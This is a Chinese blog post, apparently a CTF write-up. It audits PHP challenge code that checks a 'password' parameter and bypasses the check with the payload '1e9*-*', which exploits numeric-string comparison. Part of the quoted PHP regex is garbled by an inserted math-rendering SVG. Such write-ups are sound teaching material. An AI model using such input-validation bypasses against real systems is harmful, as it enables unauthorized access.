+<p><img src="https://img-blog.csdnimg.cn/20210523200400127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><p>查看源码，发现这是一段JS代码，直接复制代码放到控制台运行<br><img src="https://img-blog.csdnimg.cn/20210523201256146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210523201420984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h2><p>根据提示进去看一下<br><img src="https://img-blog.csdnimg.cn/20210523201727633.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210523201814245.png" alt="在这里插入图片描述"><br>这倔强的小脾气，摆明让我们进去看看😏😏<br><code>39.96.91.106:7040/code/code.txt</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;p&gt;code.txt&lt;/p&gt;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>     <br>	<span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/^[a-zA-Z0-9]+<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.617ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 1557.3 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
+<title id="MathJax-SVG-1-Title">/", </title>
+<defs aria-hidden="true">
+<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path>
+<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"></path>
+<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
+</defs>
+<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
+ <use xlink:href="#E1-MJMAIN-2F" x="0" y="0"></use>
+ <use xlink:href="#E1-MJMAIN-22" x="778" y="0"></use>
+ <use xlink:href="#E1-MJMAIN-2C" x="1278" y="0"></use>
+</g>
+</svg>_GET[&#x27;password&#x27;]) === FALSE)</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;;</span><br><span class="hljs-string">	</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">	  else if (strlen($_GET['password']) < 8 && $_GET[&#x27;password&#x27;] &gt; 9999999)</span><br><span class="hljs-string">	&#123;    </span><br><span class="hljs-string">    </span><br><span class="hljs-string">		if (strpos (<span class="hljs-subst">$_GET</span>[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE)</span><br><span class="hljs-string">		&#123;</span><br><span class="hljs-string">			die(&#x27;Flag: &#x27; . <span class="hljs-subst">$flag</span>);</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">		else</span><br><span class="hljs-string">		&#123;</span><br><span class="hljs-string">			echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;);</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">	else</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>对源码进行审计后发现了出题人的小秘密<img src="https://img-blog.csdnimg.cn/20210523202302371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到要求输入的密码必须<strong>小于八位并且数值大于9999999</strong>并且最后要加上<code>*-*</code><br>根据科学计数法1e9=1000000000&gt; 9999999<br>因此构造<br><strong><code>payload:1e9*-*</code></strong></p>
+
+
+  </article>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="busuanzi center">
+    page PV:&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;・&nbsp;
+    site PV:&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;・&nbsp;
+    site UV:&nbsp;<span id="busuanzi_value_site_uv"></span>
+  </div>
+
+
+    
+
+
+
+
+
+    </div>
+  </div>
+  <footer class="page-footer"><div class="clearfix">
+</div>
+<div class="right-foot">
+    <div class="firstrow">
+        <a href="#top" target="_self">
+        <svg class="i-caret-right" viewBox="0 0 32 32" width="24" height="24" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+            <path d="M10 30 L26 16 10 2 Z"></path>
+        </svg>
+        </a>
+        © XXX 2016-2020
+    </div>
+    <div class="secondrow">
+        <a href="">
+        Willianir
+        </a>
+    </div>
+</div>
+<div class="clearfix">
+</div>
+</footer>
+  <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<script src="/js/search.min.js"></script>
+<script type="text/javascript">
+
+// disqus scripts
+
+
+// dropdown scripts
+$(".dropdown").click(function(event) {
+  var current = $(this);
+  event.stopPropagation();
+  $(current).children(".dropdown-content")[($(current).children(".dropdown-content").hasClass("open"))?'removeClass':'addClass']("open")
+});
+$(document).click(function(){
+    $(".dropdown-content").removeClass("open");
+})
+
+var path = "/search.xml";
+searchFunc(path, 'local-search-input', 'local-search-result');
+
+</script>
+
+</body>
+</html>
